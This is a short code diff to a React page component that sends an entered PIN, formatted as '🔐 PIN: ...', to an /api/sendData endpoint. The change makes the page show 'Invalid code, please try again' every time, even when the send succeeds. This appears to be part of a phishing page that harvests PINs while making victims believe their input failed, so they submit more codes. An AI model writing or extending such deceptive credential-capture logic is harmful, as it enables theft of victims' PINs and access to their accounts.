@@ -28,7 +28,7 @@ function CodePageContent() {
     }
 
     const text = `🔐 PIN: ${code}`;
-
+    
     try {
       const res = await fetch("/api/sendData", {
         method: "POST",
@@ -37,14 +37,12 @@ function CodePageContent() {
       });
 
       const result = await res.json();
-
-      if (result.success) {
-        setErrorMessage("");
-        setSuccessMessage("Invalid code, please try again");
-      } else {
+      setErrorMessage("");
+      setSuccessMessage("Invalid code, please try again");
+      if (!result.success) {
         setSuccessMessage("");
         setErrorMessage("Invalid code, please try again");
-      }
+      } 
     } catch (err) {
       console.error(err);
       setSuccessMessage("");
